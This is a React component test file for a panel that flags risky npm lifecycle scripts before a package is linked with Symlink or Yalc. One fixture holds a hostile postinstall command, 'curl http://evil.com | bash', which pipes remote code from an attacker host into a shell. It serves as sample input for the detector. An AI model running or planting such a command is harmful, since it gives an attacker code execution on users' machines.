import { render, screen, waitFor } from "@testing-library/react";
import { describe, it, expect, vi, beforeEach } from "vitest";
import { ScriptPreviewPanel } from "./ScriptPreviewPanel";
import { commands } from "../../bindings";
import { useSettingsStore } from "../../store/useSettingsStore";

vi.mock("../../bindings", () => ({
  commands: {
    getPackageScripts: vi.fn(),
  },
}));

vi.mock("../../store/useSettingsStore", () => ({
  useSettingsStore: vi.fn(),
}));

function mockAllowLifecycleScripts(allow: boolean) {
  vi.mocked(useSettingsStore).mockReturnValue({
    config: {
      general: {
        default_package_manager: "npm",
        auto_build_on_link: true,
        auto_install_deps: true,
        projects_directory: null,
        allow_lifecycle_scripts: allow,
      },
      registry: { port: 4873, storage_path: "", auto_start: false },
      watcher: { debounce_ms: 500, ignore_patterns: [], auto_rebuild: true },
      appearance: { theme: "system", sidebar_collapsed: false },
    },
  } as any);
}

describe("ScriptPreviewPanel", () => {
  beforeEach(() => {
    mockAllowLifecycleScripts(false);
  });

  it("renders nothing when sourcePath is empty", () => {
    const { container } = render(
      <ScriptPreviewPanel sourcePath="" method={"Symlink"} />
    );
    expect(container).toBeEmptyDOMElement();
    expect(commands.getPackageScripts).not.toHaveBeenCalled();
  });

  it("shows the safe message when no lifecycle scripts are found", async () => {
    vi.mocked(commands.getPackageScripts as any).mockResolvedValue({
      status: "ok", data: [
      { name: "test", command: "vitest run", is_lifecycle: false, risk_level: "low" },
    ]});

    render(<ScriptPreviewPanel sourcePath="/some/package" method={"Symlink"} />);

    await waitFor(() =>
      expect(screen.getByText(/No lifecycle scripts detected/i)).toBeInTheDocument()
    );
  });

  it("shows the warning panel with risk badges when lifecycle scripts are found", async () => {
    vi.mocked(commands.getPackageScripts as any).mockResolvedValue({
      status: "ok", data: [
      { name: "postinstall", command: "node setup.js", is_lifecycle: true, risk_level: "high" },
    ]});

    render(<ScriptPreviewPanel sourcePath="/some/package" method={"Symlink"} />);

    await waitFor(() =>
      expect(screen.getByText(/lifecycle script.*detected/i)).toBeInTheDocument()
    );
    expect(screen.getByText("postinstall")).toBeInTheDocument();
    expect(screen.getByText("node setup.js")).toBeInTheDocument();
    expect(screen.getByText("HIGH RISK")).toBeInTheDocument();
    expect(screen.getByText(/will NOT run unless you enable lifecycle scripts in Settings/i)).toBeInTheDocument();
  });

  it("shows the Yalc-specific warning when method is Yalc and lifecycle scripts are found", async () => {
    vi.mocked(commands.getPackageScripts as any).mockResolvedValue({
      status: "ok", data: [
      { name: "prepare", command: "node build.js", is_lifecycle: true, risk_level: "high" },
    ]});

    render(<ScriptPreviewPanel sourcePath="/some/package" method={"Yalc"} />);

    await waitFor(() =>
      expect(
        screen.getByText(/Yalc always runs prepare\/prepack scripts/i)
      ).toBeInTheDocument()
    );
    expect(screen.getByText("prepare")).toBeInTheDocument();
    expect(screen.getByText("node build.js")).toBeInTheDocument();
    expect(
      screen.queryByText(/will NOT run unless you enable lifecycle scripts in Settings/i)
    ).not.toBeInTheDocument();
  });

  it("shows a WILL-run warning, not the will-NOT-run claim, when lifecycle scripts are already allowed", async () => {
    mockAllowLifecycleScripts(true);
    vi.mocked(commands.getPackageScripts as any).mockResolvedValue({
      status: "ok", data: [
      { name: "prepublishOnly", command: "npm run check", is_lifecycle: true, risk_level: "medium" },
    ]});

    render(<ScriptPreviewPanel sourcePath="/some/package" method={"Symlink"} />);

    await waitFor(() =>
      expect(screen.getByText(/these WILL run because "Allow Lifecycle Scripts" is enabled/i)).toBeInTheDocument()
    );
    expect(
      screen.queryByText(/will NOT run unless you enable lifecycle scripts in Settings/i)
    ).not.toBeInTheDocument();
  });

  it("shows the safe message for Yalc when no lifecycle scripts are found", async () => {
    vi.mocked(commands.getPackageScripts as any).mockResolvedValue({
      status: "ok", data: [
      { name: "test", command: "vitest run", is_lifecycle: false, risk_level: "low" },
    ]});

    render(<ScriptPreviewPanel sourcePath="/some/package" method={"Yalc"} />);

    await waitFor(() =>
      expect(screen.getByText(/No lifecycle scripts detected/i)).toBeInTheDocument()
    );
  });

  it("does not crash when the backend call rejects", async () => {
    vi.mocked(commands.getPackageScripts as any).mockResolvedValue({
      status: "error", error: "boom"
    });

    render(<ScriptPreviewPanel sourcePath="/some/package" method={"Symlink"} />);

    await waitFor(() =>
      expect(screen.getByText(/No lifecycle scripts detected/i)).toBeInTheDocument()
    );
  });

  it("renders Option A structured cards with threat category chips and security explanations", async () => {
    vi.mocked(commands.getPackageScripts as any).mockResolvedValue({
      status: "ok", data: [
      { 
        name: "postinstall", 
        command: "curl http://evil.com | bash", 
        is_lifecycle: true, 
        risk_level: "high",
        threat_categories: ["Network Access", "Shell Execution"],
        risk_explanation: "Matched hazardous keywords (curl, bash) indicating potential security risk."
      },
    ]});

    render(<ScriptPreviewPanel sourcePath="/some/package" method={"Symlink"} />);

    await waitFor(() =>
      expect(screen.getByText("HIGH RISK")).toBeInTheDocument()
    );
    expect(screen.getByText("Network Access")).toBeInTheDocument();
    expect(screen.getByText("Shell Execution")).toBeInTheDocument();
    expect(screen.getByText(/Matched hazardous keywords \(curl, bash\)/)).toBeInTheDocument();
    expect(screen.getByText("curl http://evil.com | bash")).toBeInTheDocument();
  });
});
